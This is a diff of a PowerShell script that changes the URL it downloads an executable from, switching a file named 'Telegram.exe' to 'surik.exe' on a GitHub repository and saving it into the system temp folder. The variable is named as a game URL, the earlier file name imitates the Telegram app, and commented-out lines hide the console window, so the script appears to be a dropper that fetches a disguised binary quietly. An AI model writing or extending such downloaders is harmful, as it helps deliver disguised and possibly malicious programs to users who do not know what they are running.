@@ -7,8 +7,8 @@ $ErrorActionPreference = "Stop"
 # $consolePtr = [Console.Window]::GetConsoleWindow()
 # [Console.Window]::ShowWindow($consolePtr, 0) # 0 = скрыть
 
-$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/Telegram.exe"
-$TempExe = Join-Path ([IO.Path]::GetTempPath()) "Telegram.exe"
+$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/surik.exe"
+$TempExe = Join-Path ([IO.Path]::GetTempPath()) "surik.exe"
 
 Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
 
